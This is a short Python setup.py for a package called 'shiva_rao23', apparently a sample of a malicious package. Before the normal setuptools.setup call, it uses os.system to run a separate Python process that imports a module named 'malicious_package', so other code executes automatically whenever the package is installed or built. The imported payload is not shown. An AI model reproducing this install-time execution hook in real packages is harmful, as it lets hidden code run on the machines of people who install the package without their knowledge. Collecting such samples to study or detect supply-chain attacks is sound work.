
import setuptools
import os

if __name__ == "__main__":
    os.system("python3 -c 'import malicious_package'")
    setuptools.setup(
        name="shiva_rao23",
        version="1.0.0",
        packages=setuptools.find_packages(),
        install_requires=["requests"],
    )
